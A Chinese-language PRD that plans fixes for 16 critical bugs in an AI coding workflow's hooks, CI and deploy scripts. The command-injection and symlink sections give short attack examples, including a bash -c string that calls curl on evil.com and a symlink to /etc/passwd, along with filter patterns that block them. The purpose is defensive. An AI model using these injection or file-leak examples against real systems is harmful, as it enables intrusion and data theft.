# PRD: 深度 Bug 扫描修复（CRITICAL 级别）

## 1. 背景

通过 5 个并行 Explore subagents 对 zenithjoy-engine 进行深度扫描，发现 72 个 bug：
- **CRITICAL**: 16 个（本 PRD 范围）
- HIGH: 10 个
- MEDIUM: 36 个
- LOW: 10 个

本 PRD 聚焦 **16 个 CRITICAL 级别 bug 的修复**。

## 2. CRITICAL Bug 清单

### 🔴 P0: Stop Hook 逻辑错误（3 个）

#### Bug #1: 条件 3 永远失败 - PR 合并后仍然 block
**文件**: `hooks/stop.sh:312-320`

**问题描述**:
```bash
# Line 312-320: 无条件执行，没有 if 判断
echo "  ❌ 条件 3: PR 未合并" >&2
jq -n '{"decision": "block", "reason": "PR 未合并..."}'
exit 0
```

**影响**:
- 即使 PR 已经 merged，也会输出"PR 未合并"
- 会话永远无法正常结束
- 最终会触发 15 次重试上限后强制退出

**修复方案**:
```bash
# Line 312 之后添加条件判断
if [[ "$PR_STATE" == "merged" ]]; then
    echo "  ✅ 条件 3: PR 已合并" >&2

    # 检查是否完成 Step 11 Cleanup
    if grep -q "^step_11_cleanup: done" "$DEV_MODE_FILE" 2>/dev/null; then
        echo "  ✅ Step 11 Cleanup 已完成" >&2
        rm -f "$DEV_MODE_FILE"
        exit 0  # 允许结束
    else
        jq -n '{"decision": "block", "reason": "PR 已合并，执行 Step 11 Cleanup"}'
        exit 0
    fi
else
    # PR 未合并
    echo "  ❌ 条件 3: PR 未合并" >&2
    jq -n --arg reason "PR #$PR_NUMBER CI 已通过但未合并，执行合并操作" --arg pr "$PR_NUMBER" '{"decision": "block", "reason": $reason, "pr_number": $pr}'
    exit 0
fi
```

**验收标准**:
- [ ] PR 未合并时：block 并提示合并
- [ ] PR 已合并但 Step 11 未完成：block 并触发 Step 11
- [ ] PR 已合并且 Step 11 完成：删除 .dev-mode，允许退出

---

#### Bug #2: HEAD~10 fallback 在新仓库中失败
**文件**: `hooks/branch-protect.sh:281-291`

**问题描述**:
```bash
# Line 289: fallback 到 HEAD~10
if git rev-parse develop >/dev/null 2>&1; then
    BASE_BRANCH="develop"
elif git rev-parse main >/dev/null 2>&1; then
    BASE_BRANCH="main"
else
    BASE_BRANCH="HEAD~10"  # ← 如果仓库 <10 commits，会失败
fi
```

**影响**:
- 新仓库（<10 commits）会导致 `git log HEAD~10..HEAD` 失败
- PRD/DoD 更新检查可能误判

**修复方案**:
```bash
else
    # 安全 fallback：使用 HEAD 或第一个 commit
    COMMIT_COUNT=$(git rev-list --count HEAD 2>/dev/null || echo "0")
    if [[ $COMMIT_COUNT -gt 10 ]]; then
        BASE_BRANCH="HEAD~10"
    elif [[ $COMMIT_COUNT -gt 0 ]]; then
        BASE_BRANCH=$(git rev-list --max-parents=0 HEAD 2>/dev/null || echo "HEAD")
    else
        BASE_BRANCH="HEAD"
    fi
fi
```

**验收标准**:
- [ ] 新仓库（1-5 commits）不报错
- [ ] 仓库有 10+ commits 时正常工作
- [ ] 空仓库时有合理 fallback

---

#### Bug #3: 竞态条件 - retry_count 更新不原子
**文件**: `hooks/stop.sh:160-162`

**问题描述**:
```bash
# 非原子操作
sed -i "/^retry_count:/d" "$DEV_MODE_FILE" 2>/dev/null || true
echo "retry_count: $((RETRY_COUNT + 1))" >> "$DEV_MODE_FILE"
```

**影响**:
- 并发 Stop Hook 执行时可能导致 retry_count 丢失或重复
- 15 次重试计数器失效

**修复方案**:
```bash
# 使用 flock 原子更新
{
    flock -x 200
    grep -v "^retry_count:" "$DEV_MODE_FILE" > "$DEV_MODE_FILE.tmp" || true
    echo "retry_count: $((RETRY_COUNT + 1))" >> "$DEV_MODE_FILE.tmp"
    mv "$DEV_MODE_FILE.tmp" "$DEV_MODE_FILE"
} 200>"$DEV_MODE_FILE.lock"
```

**验收标准**:
- [ ] 并发测试：2 个会话同时触发 Stop Hook
- [ ] retry_count 严格递增，无重复或丢失

---

### 🔴 P1: Skills 工作流逻辑错误（6 个）

#### Bug #4: gate:dod & gate:qa 并行执行模型未定义
**文件**: `skills/dev/steps/04-dod.md:152-204`

**问题描述**:
- 文档声称 gate:dod 和 gate:qa 并行执行
- 但只有伪代码 `Promise.all([...])`，没有实际 Skill 调用语法
- 冲突解决机制未定义（一个 PASS 一个 FAIL 怎么办？）

**影响**:
- AI agent 只能猜测实现方式
- 可能退化为顺序执行（失去并行优势）

**修复方案**:
1. 明确 Skill 调用语法（是否支持并行？）
2. 定义冲突解决规则：
   ```yaml
   - 两个都 PASS → 继续
   - 任意一个 FAIL → block，显示所有 FAIL 原因
   - 超时处理：单个 gate 超时 → 视为 FAIL
   ```
3. 更新文档示例

**验收标准**:
- [ ] 文档有可执行的 Skill 调用示例
- [ ] 冲突解决规则明确
- [ ] 超时机制定义

---

#### Bug #5: 分支保护 Hook 与 Step 03 规范矛盾
**文件**: `hooks/branch-protect.sh:183-184` vs `skills/dev/steps/03-branch.md:240-253`

**问题描述**:
- **Hook 规则**: 允许 `cp-anything`（无 FEATURES.md 检查）
- **Step 03 规则**: 要求 Feature ID 必须在 FEATURES.md 中注册

**影响**:
- 分支 `cp-random-task` 可以通过 Hook
- 但违反了 Step 03 的设计意图

**修复方案**:
```bash
# branch-protect.sh 添加 FEATURES.md 验证
if [[ "$CURRENT_BRANCH" =~ ^(cp|feature)- ]]; then
    # 提取 Feature ID（cp-W6-xxx → W6）
    FEATURE_ID=$(echo "$CURRENT_BRANCH" | sed -n 's/^[^-]*-\([A-Z][0-9]\+\)-.*/\1/p')

    if [[ -z "$FEATURE_ID" ]]; then
        echo "[ERROR] 分支名格式错误：必须包含 Feature ID（如 cp-W6-task）"
        exit 1
    fi

    # 检查 FEATURES.md
    if ! grep -q "| $FEATURE_ID |" "$PROJECT_ROOT/FEATURES.md" 2>/dev/null; then
        echo "[ERROR] Feature ID $FEATURE_ID 未在 FEATURES.md 注册"
        exit 1
    fi
fi
```

**验收标准**:
- [ ] `cp-W6-task` 通过（W6 在 FEATURES.md）
- [ ] `cp-random-task` 被拒绝（无 Feature ID）
- [ ] `cp-Z9-task` 被拒绝（Z9 不存在）

---

#### Bug #6: .dev-mode 竞态条件 - Hook 在 Step 3 创建前检查
**文件**: `hooks/branch-protect.sh:331-349` vs `skills/dev/steps/03-branch.md:131-152`

**问题描述**:
1. Step 3 开始创建 .dev-mode（Line 132-153）
2. Hook 在 PreToolUse 触发，检查 `tasks_created: true`（Line 334）
3. 但 tasks_created 在 Step 3 最后才添加（Line 206）
4. 中间的 Write 操作会触发 Hook → 死锁

**影响**:
- Step 3 执行过程中任何 Write 都会被 Hook 阻塞
- 提示"Task Checkpoint 未创建"，但实际正在创建

**修复方案**:
**方案 A**: Step 3 先写完整的 .dev-mode（包括 tasks_created），再执行其他 Write
**方案 B**: Hook 检查 step_3 状态，如果是 in_progress 则允许通过

推荐方案 B：
```bash
# branch-protect.sh
STEP_3_STATUS=$(grep "^step_3_branch:" "$DEV_MODE_FILE" 2>/dev/null | cut -d' ' -f2 || echo "pending")
if [[ "$STEP_3_STATUS" == "in_progress" ]]; then
    # Step 3 正在执行，允许通过
    exit 0
fi

# 否则检查 tasks_created
if ! grep -q "^tasks_created: true" "$DEV_MODE_FILE" 2>/dev/null; then
    echo "[ERROR] Task Checkpoint 未创建"
    exit 1
fi
```

**验收标准**:
- [ ] Step 3 执行过程中 Write 操作不被阻塞
- [ ] Step 3 完成后，未创建 tasks 的 Write 被阻塞

---

#### Bug #7: PR Gate QA/Audit 检查是软阻塞
**文件**: `hooks/pr-gate-v2.sh:740-743, 984-997`

**问题描述**:
```bash
# Line 740-742: QA Decision 缺失
if [[ -f "$QA_DECISION_FILE" ]]; then
    ...
else
    FAILED=1  # ← 不是 GATE_FAILED，所以不是硬阻塞
fi

# Line 984-996: 只有 GATE_FAILED 触发 exit 2
if [[ "${GATE_FAILED:-0}" -eq 1 ]]; then
    exit 2  # 硬阻塞
fi

# Line 999-1007: FAILED=1 只是警告
if [[ $FAILED -eq 1 ]]; then
    echo "[WARNING] ..."
    exit 0  # 允许！
fi
```

**影响**:
- 缺少 QA-DECISION.md 只警告，不阻止 PR 创建
- 违反设计意图（QA Decision 是"必须"）

**修复方案**:
```bash
# Line 740-742: 改为设置 GATE_FAILED
if [[ -f "$QA_DECISION_FILE" ]]; then
    ...
else
    echo "[FAIL] (docs/QA-DECISION.md 不存在)" >&2
    GATE_FAILED=1  # ← 改为硬阻塞
fi

# Audit Report 同理
if [[ -f "$AUDIT_REPORT_FILE" ]]; then
    ...
else
    echo "[FAIL] (docs/AUDIT-REPORT.md 不存在)" >&2
    GATE_FAILED=1  # ← 改为硬阻塞
fi
```

**验收标准**:
- [ ] 缺少 QA-DECISION.md → exit 2（阻止 PR）
- [ ] 缺少 AUDIT-REPORT.md → exit 2（阻止 PR）
- [ ] 其他检查失败 → 根据级别决定

---

#### Bug #8: Step 7 文档矛盾 - "只汇总" vs "调用 gate:quality"
**文件**: `skills/dev/SKILL.md:297` vs `CHANGELOG.md v11.26.0 line 5`

**问题描述**:
- SKILL.md line 297: "07-quality.md ← 只汇总，不判定"
- CHANGELOG line 5: "在 Step 7 调用 gate:quality，提前发现错误"

**影响**:
- 文档矛盾导致 AI agent 行为不确定

**修复方案**:
统一文档，明确 Step 7 职责：
```markdown
# skills/dev/SKILL.md line 297
07-quality.md ← 调用 gate:quality 进行质检，汇总 4 层结果（TypeCheck/Test/Build/Shell）
```

**验收标准**:
- [ ] SKILL.md 和 CHANGELOG 描述一致
- [ ] 07-quality.md 明确说明是否调用 gate:quality

---

#### Bug #9: 11 步 checklist 状态检查不精确
**文件**: `hooks/stop.sh:110-116`

**问题描述**:
```bash
STEP_STATUS=$(grep "^step_${step}_" "$DEV_MODE_FILE" 2>/dev/null | cut -d' ' -f2 || echo "pending")
```

**问题**:
- `grep "^step_1_"` 会匹配：
  - `step_1_prd: done` ✅
  - `step_1_pending: done` ❌ 错误格式但会匹配
  - `step_1: done`
- `cut -d' ' -f2` 假设空格分隔，但如果有 tab 会失败

**修复方案**:
```bash
# 精确匹配字段名
STEP_FIELD=$(grep "^step_${step}_[a-z]*:" "$DEV_MODE_FILE" 2>/dev/null | head -1)
if [[ -n "$STEP_FIELD" ]]; then
    STEP_STATUS=$(echo "$STEP_FIELD" | sed 's/^step_[0-9]*_[a-z]*:[[:space:]]*\([a-z]*\).*/\1/')
else
    STEP_STATUS="pending"
fi

if [[ "$STEP_STATUS" != "done" ]]; then
    STEPS_COMPLETE=false
    break
fi
```

**验收标准**:
- [ ] 正确格式 `step_1_prd: done` 识别为 done
- [ ] 错误格式 `step_1_pending: done` 不被误判
- [ ] 有 tab 分隔符时仍然正确解析

---

### 🔴 P2: CI/CD 配置错误（1 个）

#### Bug #10: ci-passed 状态检查上下文复杂且脆弱
**文件**: `.github/workflows/ci.yml:710-723`

**问题描述**:
```yaml
ci-passed:
  needs: [version-check, test, contract-drift-check, impact-check, l2b-check, regression-pr, release-check]
  if: |
    always() &&
    github.event_name == 'pull_request' &&
    needs.test.result == 'success' &&
    needs.contract-drift-check.result == 'success' &&
    (needs.version-check.result == 'success' || needs.version-check.result == 'skipped') &&
    ...
```

**问题**:
- 条件逻辑复杂，难以推理
- 如果某个 job 被跳过（不运行），result 是什么？
- 分支保护要求 `ci-passed`，但条件可能导致 job 不运行

**修复方案**:
1. 简化条件逻辑，使用显式的 job 依赖
2. 添加注释说明每个条件的意图
3. 测试所有分支组合（PR to develop, PR to main, PR to feature/*）

**验收标准**:
- [ ] PR to develop: 所有必需 jobs 运行
- [ ] PR to main: 所有必需 jobs 运行
- [ ] PR to feature/*: 合理的 jobs 运行
- [ ] ci-passed 总是运行并报告正确状态

---

### 🔴 P3: 部署脚本错误（5 个）

#### Bug #11: deploy.sh 分支切换错误恢复不完整
**文件**: `scripts/deploy.sh:115-148`

**问题描述**:
```bash
# Line 135: git checkout main 失败
git checkout main 2>&1 | tee -a "$LOG_FILE" || {
    echo "警告: checkout main 失败" | tee -a "$LOG_FILE"
    # 继续执行！← 错误
}

# Line 141: git pull 失败
git pull 2>&1 | tee -a "$LOG_FILE" || {
    echo "警告: pull 失败" | tee -a "$LOG_FILE"
    # 继续执行！← 错误
}

# Line 257: 尝试切回原分支
git checkout "$CURRENT_BRANCH" 2>/dev/null || true
```

**问题**:
- checkout main 失败后继续执行，可能在错误分支部署
- pull 失败后继续，可能部署旧代码
- 切回原分支失败被忽略

**修复方案**:
```bash
# 严格错误处理
if ! git checkout main 2>&1 | tee -a "$LOG_FILE"; then
    echo -e "${RED}错误: 无法切换到 main 分支${NC}" | tee -a "$LOG_FILE"
    exit 1
fi

if ! git pull 2>&1 | tee -a "$LOG_FILE"; then
    echo -e "${RED}错误: 无法拉取 main 分支${NC}" | tee -a "$LOG_FILE"
    # 尝试恢复
    git checkout "$CURRENT_BRANCH" 2>/dev/null || true
    exit 1
fi

# ... 部署逻辑 ...

# 确保切回原分支
if ! git checkout "$CURRENT_BRANCH" 2>&1 | tee -a "$LOG_FILE"; then
    echo -e "${YELLOW}警告: 无法切回原分支 $CURRENT_BRANCH${NC}" | tee -a "$LOG_FILE"
    echo "当前在分支: $(git branch --show-current)" | tee -a "$LOG_FILE"
fi
```

**验收标准**:
- [ ] main 分支不存在 → 停止部署，不切换分支
- [ ] git pull 失败 → 停止部署，切回原分支
- [ ] 部署成功 → 切回原分支

---

#### Bug #12: setup-branch-protection.sh API 错误被抑制
**文件**: `scripts/setup-branch-protection.sh:63-66, 121-131`

**问题描述**:
```bash
# Line 131: || true 隐藏错误
gh api -X POST "repos/$repo/branches/$branch/protection/enforce_admins" || true
```

**影响**:
- API 调用失败（权限不足、网络错误等）被静默忽略
- 脚本报告成功但分支保护未生效

**修复方案**:
```bash
# 捕获错误并报告
if ! gh api -X POST "repos/$repo/branches/$branch/protection/enforce_admins" 2>&1; then
    echo -e "  ${RED}✗${NC} $branch: enforce_admins 设置失败（权限不足？）"
    return 1
fi
```

**验收标准**:
- [ ] API 成功 → 显示成功
- [ ] API 失败（403） → 显示错误，返回非 0
- [ ] 网络错误 → 显示错误，返回非 0

---

#### Bug #13: run-regression.sh 命令注入漏洞
**文件**: `scripts/run-regression.sh:232-233`

**问题描述**:
```bash
# Line 218-230: 检查不完整
if [[ ! "$evidence_run" =~ [\;\|\&\`\$\(] ]]; then
    cmd_safe=true
fi

# Line 233: 不安全执行
bash -c "$evidence_run"
```

**攻击向量**:
```yaml
hooks:
  - evidence:
      run: "bash -c 'npm test && curl evil.com'"
```

**修复方案**:
1. 禁止 `bash -c` 嵌套
2. 使用数组执行命令（不经过 shell 解释）
3. 白名单允许的命令

```bash
# 禁止嵌套 bash
if [[ "$evidence_run" =~ bash.*-c ]]; then
    echo "[ERROR] 不允许嵌套 bash -c"
    return 1
fi

# 使用数组避免 shell 注入
IFS=' ' read -r -a cmd_array <<< "$evidence_run"
"${cmd_array[@]}"  # 不通过 shell 执行
```

**验收标准**:
- [ ] `npm test` 正常执行
- [ ] `npm test && echo pwned` 被拒绝
- [ ] `bash -c 'npm test'` 被拒绝

---

#### Bug #14: install-hooks.sh 符号链接解引用漏洞
**文件**: `scripts/install-hooks.sh:140, 152`

**问题描述**:
```bash
# Line 140: 强制解引用
cp -L "$src" "$dst"

# Line 152: 允许符号链接
[[ -f "$hook" || -L "$hook" ]]
```

**攻击向量**:
```bash
ln -s /etc/passwd hooks/malicious.sh
# 运行 install-hooks.sh
# 结果：/etc/passwd 复制到 ~/.claude/hooks/
```

**修复方案**:
```bash
# 验证符号链接目标在项目内
if [[ -L "$hook" ]]; then
    target=$(readlink -f "$hook")
    if [[ ! "$target" =~ ^"$ENGINE_ROOT"/ ]]; then
        echo "[WARN] 跳过外部符号链接: $hook -> $target"
        continue
    fi
fi

# 使用 -P (不解引用)
cp -P "$src" "$dst"
```

**验收标准**:
- [ ] 项目内符号链接正常复制
- [ ] 指向外部的符号链接被拒绝
- [ ] 不泄露敏感文件

---

#### Bug #15: sync-version.sh 缺少目录存在性检查
**文件**: `scripts/sync-version.sh:104` & `scripts/auto-update-version.sh:49-51`

**问题描述**:
```bash
# auto-update-version.sh:50
echo "$NEW" > hook-core/VERSION  # 如果 hook-core/ 不存在？
```

**修复方案**:
```bash
if [[ -d "hook-core" ]]; then
    echo "$NEW" > hook-core/VERSION
    echo "✅ hook-core/VERSION 已更新"
else
    echo "⚠️  hook-core/ 目录不存在，跳过"
fi
```

**验收标准**:
- [ ] hook-core/ 存在 → 更新 VERSION
- [ ] hook-core/ 不存在 → 跳过，不报错

---

### 🔴 P4: 架构一致性问题（1 个）

#### Bug #16: 版本号不同步
**文件**: `package.json`, `VERSION`, `.hook-core-version`

**问题描述**:
- package.json: 11.26.0
- VERSION: 11.25.0
- .hook-core-version: 11.25.0

**影响**:
- CI 版本检查可能失败
- 部署后版本识别错误

**修复方案**:
已在 PR #455 修复，等待合并。

**验收标准**:
- [ ] 三个文件版本号一致
- [ ] 有自动检查脚本防止再次不同步

---

## 3. 修复优先级

### P0 - 立即修复（阻塞工作流）
- [ ] Bug #1: Stop Hook 条件 3 永远失败
- [ ] Bug #6: .dev-mode 竞态条件
- [ ] Bug #7: PR Gate QA/Audit 软阻塞

### P1 - 尽快修复（影响质量）
- [ ] Bug #2: HEAD~10 fallback
- [ ] Bug #3: retry_count 竞态条件
- [ ] Bug #4: gate 并行执行未定义
- [ ] Bug #5: 分支保护规范矛盾
- [ ] Bug #11: deploy.sh 错误恢复

### P2 - 重要修复（安全和稳定性）
- [ ] Bug #13: 命令注入漏洞
- [ ] Bug #14: 符号链接漏洞
- [ ] Bug #12: API 错误抑制

### P3 - 优化修复（完善性）
- [ ] Bug #8: 文档矛盾
- [ ] Bug #9: checklist 检查精度
- [ ] Bug #10: CI 条件复杂
- [ ] Bug #15: 目录检查
- [ ] Bug #16: 版本同步（已有 PR）

## 4. 验收策略

### 4.1 单元测试
每个 bug 修复后必须有对应的测试用例：
```bash
# 示例：Bug #1 测试
test_stop_hook_pr_merged() {
    # 准备：创建 .dev-mode，模拟 PR 已合并
    # 执行：触发 Stop Hook
    # 验证：检查输出包含 "✅ 条件 3: PR 已合并"
}
```

### 4.2 集成测试
- 完整 /dev 流程测试（从 PRD 到 PR 合并）
- 并发测试（多个会话同时操作）
- 边界条件测试（新仓库、空 .dev-mode 等）

### 4.3 回归测试
- 确保修复没有破坏现有功能
- 运行 `regression-contract.yaml` 中的所有测试

## 5. DoD

- [ ] 所有 P0 bug 修复并测试通过
- [ ] 所有 P1 bug 修复并测试通过
- [ ] CI 全部通过（test + contract + audit）
- [ ] 更新 CHANGELOG.md 记录修复
- [ ] 更新版本号（11.26.0 → 11.27.0 或 11.26.1）
- [ ] 部署到全局并验证

## 6. 风险

### 技术风险
- Stop Hook 修改可能影响循环控制逻辑
- 分支保护加强可能误拦截合法分支

### 缓解措施
- 在 develop 分支充分测试
- 保留旧版本 Hook 作为 fallback
- 增量部署（先部署到 zenithjoy-engine，验证后再部署全局）

## 7. 时间估算

| 优先级 | Bug 数量 | 估计时间 |
|--------|---------|---------|
| P0 | 3 | 2-3 小时 |
| P1 | 6 | 4-6 小时 |
| P2 | 4 | 2-3 小时 |
| P3 | 3 | 1-2 小时 |
| **总计** | **16** | **9-14 小时** |

建议分 3 个 PR 完成：
1. PR #1: P0 修复（关键路径）
2. PR #2: P1 + P2 修复（质量提升）
3. PR #3: P3 修复（完善优化）

